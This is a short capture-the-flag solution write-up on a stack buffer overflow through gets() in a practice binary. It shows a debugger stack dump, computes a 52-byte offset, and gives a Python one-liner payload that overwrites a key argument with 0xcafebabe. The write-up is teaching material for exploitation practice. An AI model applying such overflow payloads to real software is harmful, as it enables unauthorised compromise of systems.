# Solution

It is clear after looking at the source code that we need to use the call
to `gets()` to overflow the 32-bit buffer and write 0xcafebabe to where 
the key arguement is stored on the stack.


We can debug the binary and put a breakpoint after the call to gets. 
Inspecting the stack gives us:

```
- offset -   0 1  2 3  4 5  6 7  8 9  A B  C D  E F  0123456789ABCDEF

             /esp
0xffb01e70  8c1e b0ff 141f b0ff 0010 79f7 575d 0000  ..........y.W]..
                                           /eax
0xffb01e80  ffff ffff 2f00 0000 c8bd 5ef7 4141 4242  ..../.....^.AABB
0xffb01e90  4343 4444 0010 79f7 0100 0000 9df4 5956  CCDD..y.......YV
0xffb01ea0  0100 0000 0000 0000 f40f 5a56 0004 bb53  ..........ZV...S
                                 /ebp
0xffb01eb0  0010 79f7 0010 79f7 d81e b0ff 9ff6 5956  ..y...y.......YV
0xffb01ec0  efbe adde 50f2 5956 b9f6 5956 0000 0000  ....P.YV..YV....
0xffb01ed0  0010 79f7 0010 79f7 0000 0000 3776 5ff7  ..y...y.....7v_.
0xffb01ee0  0100 0000 741f b0ff 7c1f b0ff 0000 0000  ....t...|.......
0xffb01ef0  0000 0000 0000 0000 0010 79f7 046c 7cf7  ..........y..l|.
0xffb01f00  0060 7cf7 0000 0000 0010 79f7 0010 79f7  .`|.......y...y.
0xffb01f10  0000 0000 6970 24b2 785e f26c 0000 0000  ....ip$.x^.l....
0xffb01f20  0000 0000 0000 0000 0100 0000 30f5 5956  ............0.YV
0xffb01f30  0000 0000 106f 7bf7 8017 7bf7 f40f 5a56  .....o{...{...ZV
0xffb01f40  0100 0000 30f5 5956 0000 0000 61f5 5956  ....0.YV....a.YV
0xffb01f50  8af6 5956 0100 0000 741f b0ff b0f6 5956  ..YV....t.....YV
0xffb01f60  20f7 5956 8017 7bf7 6c1f b0ff 1869 7cf7   .YV..{.l....i|.
```


At address 0xffb01e8c, the input string starts ('AABBCCDD'). At address
0xffb01ec0 the parameter to `func()` is stored. We need to write
`0xffb01ec0 - 0xffb01e8c = 52` bytes, followed by the byte string for 
0xcafebabe in order to overflow the key variable properly. 

```
$ python -c "print 'A'*52 + '\xbe\xba\xfe\xca'"
```

